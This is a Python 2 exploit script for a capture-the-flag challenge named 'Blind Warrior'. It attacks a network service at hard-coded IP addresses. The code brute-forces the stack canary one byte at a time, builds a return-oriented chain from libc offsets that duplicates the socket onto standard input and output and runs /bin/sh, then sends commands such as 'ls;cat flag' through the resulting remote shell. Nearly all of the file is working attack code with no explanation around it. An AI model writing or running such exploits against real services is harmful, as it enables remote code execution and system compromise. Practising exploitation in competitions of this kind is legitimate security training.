__author__ = 'HuyNA'

"""
Blind Warrior

Sourcecode
gcc -pie hard.c -o hard
Target: 23.98.70.167:5000
23.98.66.154:5000

0x3004{There_is_a_hardest_chal_ever}
6
7
flag
6
7
flag
"""
import os
import socket
import time
import struct
import sys
import base64
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

host = "23.98.66.154" ; port = 4444
#host="192.168.248.174" ; port = 5001

# remote
# 009d4ab7 7d815476 30af27a8 ff7f0000 960de318 097f0000000000000000
# 0089bbdf 776477b6 100f058b ff7f0000 96ddc1da bc7f00000000000000000000
# 00c69e77 9206cba0 10387fdd ff7f0000 960df131 aa7f0000000000000000000000
# 0024030f d0b3b4de d0b4aa80 ff7f0000
# local
# 0058910c 00000000 00000000 00000000 076a7eb7 00000000000000000000000000

stack_canary_2 =    '009d4ab77d81547630af27a8ff7f0000960de318097f0000000000000000'
stack_canary_3 =    '009d4ab77d81547630af27a8ff7f00009609'

def test_local():
    global port1, local_host, host, port
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #s.connect((host, port))
    s.connect((local_host, port1))
    t = 244
    t = struct.pack("<B",t)
    data1 = "a"*1024#+stack_canary_2+"\x11"+"\n"
    s.send(data1)
    time.sleep(0.1)
    print s.recv(1000)
    s.close()
#test_local()

def ma(canary):
    global host, port
    #for i in reversed(xrange(256)):
    for i in xrange(256):
        time.sleep(0.5)
        try:
            print i,'\t',
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.settimeout(2.5)
            t = struct.pack("<B",i)
            data_send = '1'*1032+canary+t #+ "\n"
            s.send(data_send)
            data_recv = s.recv(20000)
            print data_recv
            if ("FINE" in data_recv):
                print "DONE"
                return t
        except socket.error as socketerror:
            print "Invalid byte"
        finally:
            s.close()

# Brute-force canary
def get_canary():
    d = '00'
    d = d.decode("hex")
    for j in xrange(11):
        print '======================================================================================'
        t = ma(d)
        d += t
        print j,"\t",d.encode("hex")
    d = d + 'ff7f0000'.decode('hex')
    for j in xrange(4):
        print '======================================================================================'
        t = ma(d)
        d += t
        print j,"\t",d.encode("hex")
    return d
def test_remote(d):
    global host, port
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    d = d.decode("hex")
    data_send = "1"*1032 + d
    print len(data_send)
    s.send(data_send)
    time.sleep(1)

    s.send('ls;cat flag\n')
    s.send('ls\n')
    s.send('ls\n')
    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)
    s.close()
# 7a0a4000  => return FINE
# 8c0a4000  => return stack mem
# 7a0a97b2
def build_rop(libc_base_address):
    dup2_address_offset = 0x0ECE70; dup2_address = libc_base_address + dup2_address_offset
    execv_address_offset = 0x00C2270; execv_address = libc_base_address + execv_address_offset
    bin_sh_string_address_ofset = 0x017DBC5; bin_sh_string_address = libc_base_address + bin_sh_string_address_ofset
    poppopret = 0x0C2E4D
    socket_descriptor = 0x04
    rop = ''
    #0x0003db48: pop rdi ; ret  ;  (1 found)
    #0x000b136a: pop rsi ; ret  ;  (1 found)
    poprdi_ret = libc_base_address + 0x0003db48
    poprsi_ret = libc_base_address + 0x000b136a
    rop +=  struct.pack("<Q", poprdi_ret)
    rop +=  struct.pack("<Q", socket_descriptor)
    rop +=  struct.pack("<Q", poprsi_ret)
    rop +=  struct.pack("<Q", 0x00000000)
    rop +=  struct.pack("<Q", dup2_address) # dup2(4,0)

    rop +=  struct.pack("<Q", poprdi_ret)
    rop +=  struct.pack("<Q", socket_descriptor)
    rop +=  struct.pack("<Q", poprsi_ret)
    rop +=  struct.pack("<Q", 0x00000001)
    rop +=  struct.pack("<Q", dup2_address) # dup2(4,1)

    rop +=  struct.pack("<Q", poprdi_ret)
    rop +=  struct.pack("<Q", socket_descriptor)
    rop +=  struct.pack("<Q", poprsi_ret)
    rop +=  struct.pack("<Q", 0x00000002)
    rop +=  struct.pack("<Q", dup2_address) # dup2(4,1)

    rop +=  struct.pack("<Q", poprdi_ret)
    rop +=  struct.pack("<Q", bin_sh_string_address)
    rop +=  struct.pack("<Q", poprsi_ret)
    rop +=  struct.pack("<Q", 0x00000000)
    rop +=  struct.pack("<Q", execv_address) # execv("/bin/sh", NULL)
    rop +=  struct.pack("<Q", poppopret)

    return rop

libc_base = 0x7F09B2954000
write_address = libc_base + 0xEC6F0
stack_canary_test = '000f00ff9692134370ee72f5ff7f00007a0a400000000000'#070a40'
t = struct.pack("<Q",write_address).encode('hex')   # test
t = build_rop(libc_base)
t = t.encode('hex')
stack_canary_test = '000f00ff9692134370ee72f5ff7f0000'+t
#stack_canary_test = '00ad518de0f34f9ba0a82a57ff7f0000b60a400000000000'
test_remote(stack_canary_test)

#get_canary()
# 64 	Invalid byte
def aaa():
    d = '0024030fd0b3b4ded0b4aa80ff7f0000070a'
    d='000f00ff9692134370ee72f5ff7f00007a0a400000000000'+'2'*80+'04'+'0'*32+'0'*16  # remote
    d=''    # local
    d = d.decode("hex")
    for j in xrange(24):
        print '======================================================================================'
        t = ma(d)
        d += t
        print j,"\t",d.encode("hex")

#aaa()

#[+] Find stack canary + return address
#stack_canary = get_canary()
#address_after_doprocessing = stack_canary[12:16]

#[+] Find address of
#.text:00000A17 164 8B 44 24 34                     mov     eax, [esp+34h]
#.text:00000A1B 164 89 04 24                        mov     [esp], eax              ; fd
#.text:00000A1E 164 E8 11 18 00 00                  call    write                   ; Call Procedure
address_write = 0x00


# rop = build_rop()
# [+] Send rop ....
#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect((host, port))
#data_send = 'Z'*1032 + rop
#s.send(data_send)
#time.sleep(1)
#data_recv = s.recv(100000)
#print data_recv

